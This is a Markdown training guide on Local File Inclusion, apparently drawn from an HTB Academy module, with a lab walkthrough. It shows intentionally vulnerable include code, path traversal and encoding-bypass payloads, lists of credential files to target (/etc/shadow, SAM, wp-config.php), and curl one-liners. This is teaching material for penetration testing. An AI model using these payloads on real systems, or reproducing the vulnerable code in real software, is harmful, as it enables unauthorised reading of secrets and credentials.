# Basic LFI Techniques - HTB Academy Guide

## Overview

Local File Inclusion (LFI) is a web application vulnerability that allows attackers to include and read local files from the server's filesystem. This occurs when applications dynamically include files based on user input without proper validation or sanitization.

**Impact:**
- **Sensitive file disclosure** - Reading system files like `/etc/passwd`, `/etc/shadow`
- **Source code disclosure** - Accessing application source code
- **Configuration file access** - Database credentials, API keys
- **Log file poisoning** - Potential code execution through log injection
- **Remote Code Execution** - Combined with file upload or log poisoning
- **Information gathering** - System enumeration and reconnaissance

---

## How LFI Works

### Vulnerable Code Examples

**Basic Include Function:**
```php
<?php
include($_GET['page']);
?>
```

**Template Loading:**
```php
<?php
include("./templates/" . $_GET['language'] . ".php");
?>
```

**File Reading Function:**
```php
<?php
$file = $_GET['file'];
echo file_get_contents($file);
?>
```

**Node.js Example:**
```javascript
const fs = require('fs');
app.get('/file', (req, res) => {
    const file = req.query.file;
    res.send(fs.readFileSync(file, 'utf8'));
});
```

### Vulnerable Functions

**PHP Functions:**
- `include()` / `include_once()`
- `require()` / `require_once()`
- `file_get_contents()`
- `fopen()` / `fread()`
- `readfile()`
- `file()`

**Other Languages:**
- **Node.js:** `fs.readFile()`, `fs.readFileSync()`
- **Python:** `open()`, `file()`
- **Java:** `FileInputStream`, `Files.readAllLines()`
- **.NET:** `File.ReadAllText()`, `StreamReader`

---

## Basic LFI Exploitation

### 1. Direct File Access

**Example Application:**
```
http://target.com/index.php?language=en
```

**LFI Test:**
```bash
# Test basic LFI
http://target.com/index.php?language=/etc/passwd

# Expected result: Contents of /etc/passwd displayed
```

### 2. Path Traversal Techniques

**Directory Traversal Sequences:**
```bash
# Basic path traversal
../../../../../../../etc/passwd

# Alternative variations
..\/..\/..\/..\/etc/passwd
....//....//....//etc/passwd

# Absolute paths (sometimes work)
/etc/passwd
C:\Windows\System32\drivers\etc\hosts
```

**Common Path Depths:**
```bash
# Test different depths
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### 3. Path Traversal Examples

```bash
# Linux examples
http://target.com/index.php?file=../../../../../../../etc/passwd
http://target.com/index.php?page=../../../../var/log/apache2/access.log
http://target.com/index.php?lang=../../../../../../proc/version

# Windows examples  
http://target.com/index.php?file=../../../../../../../windows/system32/drivers/etc/hosts
http://target.com/index.php?page=../../../../boot.ini
http://target.com/index.php?lang=../../../../../../windows/win.ini
```

---

## Common Readable Files

### Linux System Files

**Essential System Files:**
```bash
# User information
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes (if readable)
/etc/group                     # User groups
/etc/sudoers                   # Sudo configuration

# System information
/etc/os-release               # OS version
/proc/version                 # Kernel version
/proc/cpuinfo                 # CPU information
/proc/meminfo                 # Memory information
/etc/hostname                 # System hostname
/etc/hosts                    # Host file
/etc/networks                 # Network configuration

# Service configurations
/etc/ssh/sshd_config         # SSH configuration
/etc/apache2/apache2.conf    # Apache configuration
/etc/nginx/nginx.conf        # Nginx configuration
/etc/mysql/my.cnf            # MySQL configuration
/etc/php/*/apache2/php.ini   # PHP configuration
```

**Application Files:**
```bash
# Web application files
/var/www/html/index.php      # Web root files
/var/www/html/config.php     # Configuration files
/var/www/html/.htaccess      # Apache rules
/var/www/html/wp-config.php  # WordPress config

# Application logs
/var/log/apache2/access.log  # Apache access logs
/var/log/apache2/error.log   # Apache error logs
/var/log/nginx/access.log    # Nginx access logs
/var/log/nginx/error.log     # Nginx error logs
/var/log/auth.log           # Authentication logs
/var/log/syslog             # System logs

# Environment and process information
/proc/self/environ          # Current process environment
/proc/self/cmdline          # Current process command line
/proc/self/fd/0             # Standard input
/proc/1/environ             # Init process environment
```

### Windows System Files

**Essential System Files:**
```bash
# System information
C:\Windows\System32\drivers\etc\hosts   # Hosts file
C:\Windows\boot.ini                     # Boot configuration
C:\Windows\win.ini                      # Windows configuration
C:\Windows\System32\eula.txt           # System information

# User information  
C:\Windows\repair\SAM                   # SAM database backup
C:\Windows\System32\config\SAM         # SAM database
C:\Windows\System32\config\SYSTEM      # System registry
C:\Users\Administrator\Desktop\         # Admin desktop
C:\Users\Administrator\Documents\       # Admin documents
```

**IIS and Application Files:**
```bash
# IIS configuration
C:\inetpub\wwwroot\web.config          # IIS web configuration
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config  # .NET config

# Application files
C:\inetpub\wwwroot\index.html          # Default web page
C:\xampp\htdocs\                       # XAMPP web root
C:\wamp\www\                           # WAMP web root

# IIS logs
C:\inetpub\logs\LogFiles\W3SVC1\       # IIS access logs
C:\Windows\System32\LogFiles\          # System logs
```

---

## HTB Academy Basic LFI Labs

### HTB Academy Basic LFI Lab Solution

**Target:** Accessible via HTB Academy platform  
**Objective:** Find user starting with "b" and read flag.txt

#### Lab Solution 1: Find User Starting with "b"
```bash
# Read /etc/passwd to find users
http://94.237.60.55:55141/index.php?language=../../../../etc/passwd

# Look for users starting with "b"
# Expected users: barry, bin, backup, etc.
```

**Answer:** `barry`

#### Lab Solution 2: Read flag.txt  
```bash
# Common flag locations to test
http://94.237.60.55:55141/index.php?language=../../../../flag.txt
http://94.237.60.55:55141/index.php?language=../../../../usr/share/flags/flag.txt
http://94.237.60.55:55141/index.php?language=../../../../var/flag.txt
http://94.237.60.55:55141/index.php?language=../../../../home/flag.txt

# Working payload:
http://94.237.60.55:55141/index.php?language=../../../../usr/share/flags/flag.txt
```

**Answer:** `HTB{...}`

---

## LFI Discovery and Testing

### Manual Testing Methodology

**Step 1: Parameter Identification**
```bash
# Look for parameters that might include files
?file=
?path=  
?page=
?include=
?inc=
?template=
?lang=
?language=
?dir=
?folder=
?document=
?root=
```

**Step 2: Basic LFI Tests**
```bash
# Test with common files
?file=/etc/passwd
?file=../../../etc/passwd
?file=../../../../etc/passwd
?file=../../../../../etc/passwd

# Test with different file extensions
?file=/etc/passwd%00
?file=/etc/passwd.txt
?file=/etc/passwd.php
```

**Step 3: Error Analysis**
```bash
# Look for error messages that reveal:
# - Full file paths
# - Web root directory
# - Application structure
# - PHP configuration details
```

### Manual Testing Checklist

```bash
# 1. Identify potential LFI parameters
- Look for file-related parameters in URLs
- Test POST parameters with file inclusion
- Check hidden form fields

# 2. Test basic LFI payloads
- Direct file access: /etc/passwd, /windows/win.ini
- Path traversal: ../../../../etc/passwd
- Different depths: test 1-10 levels of ../

# 3. Test common files
- System files: /etc/passwd, /proc/version
- Application files: config.php, wp-config.php
- Log files: access.log, error.log

# 4. Analyze application behavior
- Error messages and stack traces
- Response differences (size, timing)
- Application logic and file handling

# 5. Document findings
- Working payloads and file paths
- Accessible files and their contents
- Potential escalation paths
```

---

## LFI Troubleshooting & Common Mistakes

### Problem: No output or blank page
```bash
# Issue: LFI working but no content displayed
# Check 1: Verify file exists and is readable
ls -la /etc/passwd

# Check 2: Test different files
/proc/version    # Usually always readable
/etc/hostname    # Small file, usually readable

# Check 3: Check for null byte issues
?file=/etc/passwd%00
?file=/etc/passwd%00.php
```

### Problem: Path traversal not working
```bash
# Issue: ../ sequences being filtered
# Check 1: Try different encodings
../              # Basic
..%2f            # URL encoded
..%252f          # Double URL encoded
%2e%2e%2f        # Full URL encoded

# Check 2: Try different traversal patterns
....//           # Bypass non-recursive filtering
..\/             # Windows-style paths
```

### Problem: File not found errors
```bash
# Issue: Files exist but not accessible via LFI
# Check 1: Try absolute paths
/etc/passwd      # Absolute path
file:///etc/passwd  # File protocol

# Check 2: Try different file locations
# Linux alternatives:
/usr/local/etc/passwd
/opt/local/etc/passwd

# Check 3: Try application-specific paths
./config/database.php
../config/config.php
../../config.inc.php
```

### Problem: Application adding file extensions
```bash
# Issue: Application adds .php or .txt to input
# Check 1: Null byte injection (PHP < 5.3)
/etc/passwd%00

# Check 2: Path truncation (PHP < 5.5)
/etc/passwd/./././././././.[repeat ~2048 chars]

# Check 3: Try files with expected extensions
/var/log/apache2/access.log  # .log extension
/etc/apache2/sites-available/000-default.conf  # .conf extension
```

---

## Tools and Resources

### Manual Testing Tools
```bash
# Basic curl testing
curl "http://target.com/index.php?file=../../../../etc/passwd"

# Burp Suite for parameter testing
# - Use Intruder for payload fuzzing
# - Use Repeater for manual testing
# - Use Spider to find LFI parameters

# Browser developer tools
# - Network tab for parameter analysis
# - View source for hidden parameters
```

### Useful Commands
```bash
# Quick LFI test
curl -s "http://target.com/lfi.php?file=../../../../etc/passwd" | head -10

# Check file existence
curl -s "http://target.com/lfi.php?file=../../../../etc/passwd" | grep "root:"

# Extract specific information
curl -s "http://target.com/lfi.php?file=../../../../etc/passwd" | cut -d':' -f1,3,6
```

### Common LFI Wordlists
```bash
# SecLists wordlists
/opt/useful/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/opt/useful/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Custom wordlist creation
cat << 'EOF' > lfi_files.txt
/etc/passwd
/etc/shadow
/etc/hosts
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
EOF
```

---

*This guide covers fundamental Local File Inclusion techniques from HTB Academy's File Inclusion module, providing essential knowledge for penetration testing and web application security assessment.* 